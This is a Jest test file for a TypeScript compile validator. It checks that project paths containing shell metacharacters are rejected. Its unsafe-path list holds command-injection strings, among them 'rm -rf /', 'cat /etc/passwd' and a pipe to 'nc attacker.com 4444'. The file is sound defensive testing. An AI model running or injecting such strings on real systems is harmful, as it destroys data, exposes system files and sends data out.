/**
 * Compile Validator — Security and functionality tests
 *
 * These tests spawn tsc as a child process, which can be slow under parallel
 * Jest workers.  A file-level timeout of 30 s prevents flaky CI failures.
 */

jest.setTimeout(30_000);

import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';
import { CompileValidator } from '../compile-validator';

const TYPESCRIPT_DIR = path.resolve(__dirname, '../../../../node_modules/typescript');

describe('CompileValidator', () => {
  let tmpDir: string;

  function prepareProjectDir(dir: string): void {
    fs.writeFileSync(
      path.join(dir, 'tsconfig.json'),
      JSON.stringify({ compilerOptions: { target: 'ES2020', module: 'commonjs', strict: true } }),
    );
    // Symlink typescript so tsc binary is available
    fs.symlinkSync(TYPESCRIPT_DIR, path.join(dir, 'node_modules', 'typescript'), 'dir');
    // Create the .bin symlink for npx compatibility
    fs.mkdirSync(path.join(dir, 'node_modules', '.bin'), { recursive: true });
    fs.symlinkSync(
      path.join(TYPESCRIPT_DIR, 'bin', 'tsc'),
      path.join(dir, 'node_modules', '.bin', 'tsc'),
    );
  }

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'anfsf-compile-test-'));
    fs.mkdirSync(path.join(tmpDir, 'node_modules'), { recursive: true });
    prepareProjectDir(tmpDir);
  });

  afterEach(() => {
    // Remove symlinks first
    try { fs.rmSync(path.join(tmpDir, 'node_modules'), { recursive: true, force: true }); } catch { /* ignore */ }
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  it('rejects unsafe paths with shell metacharacters', async () => {
    const validator = new CompileValidator();

    const unsafePaths = [
      '/tmp/test; rm -rf /',
      '/tmp/test && cat /etc/passwd',
      '/tmp/test | nc attacker.com 4444',
      '/tmp/test$(whoami)',
      '/tmp/test`id`',
      '/tmp/test>output',
      'some/path/with spaces',
      '../relative/path',
    ];

    for (const unsafePath of unsafePaths) {
      const result = await validator.validate(unsafePath);
      expect(result.success).toBe(false);
      expect(result.errors).toContain('Invalid project directory path: contains unsafe characters');
    }
  });

  it('rejects non-existent directories', async () => {
    const validator = new CompileValidator();
    const result = await validator.validate('/nonexistent/path/that/does/not/exist');
    expect(result.success).toBe(false);
    expect(result.errors[0]).toContain('Invalid project directory path');
  });

  it('reports TypeScript errors correctly', async () => {
    fs.writeFileSync(
      path.join(tmpDir, 'bad.ts'),
      'const x: number = "not a number";',
    );

    const validator = new CompileValidator();
    const result = await validator.validate(tmpDir);
    expect(result.success).toBe(false);
    expect(result.errors.length).toBeGreaterThan(0);
    const errorText = result.errors.join('\n');
    expect(errorText.toLowerCase()).toMatch(/number|string/);
  });

  it('passes valid TypeScript files', async () => {
    fs.writeFileSync(
      path.join(tmpDir, 'good.ts'),
      'export const greeting: string = "hello";',
    );

    const validator = new CompileValidator();
    const result = await validator.validate(tmpDir);
    expect(result.success).toBe(true);
    expect(result.errors).toEqual([]);
  });

  it('does not use shell for command execution', async () => {
    const validator = new CompileValidator();
    const result = await validator.validate('/tmp/$(echo pwned)');
    expect(result.success).toBe(false);
    expect(result.errors).toContain('Invalid project directory path: contains unsafe characters');
  });
});
